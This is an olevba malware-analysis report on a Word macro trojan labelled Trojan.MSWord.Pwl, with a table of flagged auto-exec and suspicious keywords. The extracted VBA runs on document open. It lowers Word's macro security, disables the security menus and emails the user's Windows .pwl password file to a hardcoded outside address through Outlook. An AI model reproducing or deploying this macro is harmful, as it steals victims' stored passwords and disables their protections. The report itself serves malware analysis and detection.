olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Pwl-4e2fb041bbb1023b2a4a42b10ed5db2e38241efe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Pwl-4e2fb041bbb1023b2a4a42b10ed5db2e38241efe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_New()

End Sub

Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
Else
CommandBars("Tools").Controls("Macro").Enabled = False
End If

Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice, GetUser, Xx
Dim ThePath As String * 255
Dim PwlPath As String

    GetUser = Application.UserName
    Xx = GetWindowsDirectory(ThePath, 255)
    PwlPath = Left(ThePath, Xx) & "\" & GetUser & ".pwl"
    
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
        
        DasMapiName.Logon
        TheAddress = "neetazz86@hotmail.com"
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        BreakUmOffASlice.Recipients.Add TheAddress
        BreakUmOffASlice.Subject = "Pwl From " & Application.UserName
        BreakUmOffASlice.Body = "Here it is"
        BreakUmOffASlice.Attachments.Add PwlPath
        BreakUmOffASlice.Send
        BreakUmOffASlice.Delete
        DasMapiName.Logoff
            
     '  Selection.TypeText PwlPath
        
   End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan.MSWord.Pwl-4e2fb041bbb1023b2a4a42b10ed5db2e38241efe - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
'ucbC><Kd
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

